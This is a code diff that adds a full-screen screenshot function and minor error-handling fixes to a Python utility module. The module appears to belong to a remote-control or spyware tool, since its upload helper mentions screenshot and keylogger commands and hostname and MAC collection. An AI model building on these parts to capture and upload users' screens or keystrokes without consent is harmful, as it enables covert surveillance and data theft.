@@ -14,6 +14,7 @@ from os import getcwd, getpid, path, remove
 from socket import gethostname, gethostbyname
 from uuid import getnode as get_system_mac_addres
 from bs4 import BeautifulSoup
+from PIL import ImageGrab
 
 
 def get_current_epoc_time() -> float:
@@ -281,7 +282,7 @@ def make_zip_file(route, logger, delete_input_file=False):
 
     if not path.isfile(route):
         logger.error('make_zip_file: is not a file')
-        return False, 'None'
+        return False, 'make_zip_file: is not a file'
 
     try:
         with zipfile.ZipFile(new_file_name, "w", compression=zipfile.ZIP_DEFLATED) as zf:
@@ -297,7 +298,7 @@ def make_zip_file(route, logger, delete_input_file=False):
 
     except Exception as error:
         logger.error(f'make_zip_file: {error}')
-        return False, error
+        return False, str(error)
 
 
 def conver_json_to_dict(json_data: json) -> dict:
@@ -306,7 +307,7 @@ def conver_json_to_dict(json_data: json) -> dict:
 
 
 def upload_server_1(file: bytes, file_name: str, logger, time_out: int = 1200, file_type: str = 'zip'):
-    # time_out 1200: 20 min
+    # time_out 1200 s == 20 min
     '''api for upload zip file and return download link \n
     this use in commands: import_file, screen_shut, key_loger,.. \n
     its not safe for file transfer!
@@ -376,3 +377,21 @@ def upload_server_1(file: bytes, file_name: str, logger, time_out: int = 1200, f
     except Exception as error:
         logger.error(f'upload_server_1.extract download link error: {error}')
         return False, 'None'
+
+
+def screenshot_pil(logger, route: str = ''):
+    '''get a sreenshot and save to file , return file name or False'''
+    try:
+        file_name = str(int(get_current_epoc_time()))
+        file = open(f'{route}{file_name}.png', 'wb')
+
+        screenshot = ImageGrab.grab()
+        # Save the image to the file object as a PNG
+        screenshot.save(file, 'PNG')
+
+        file.close()
+        return f'{file_name}.png'
+
+    except Exception as error:
+        logger.info(f'util.screenshot_pil error: {error}')
+        return False
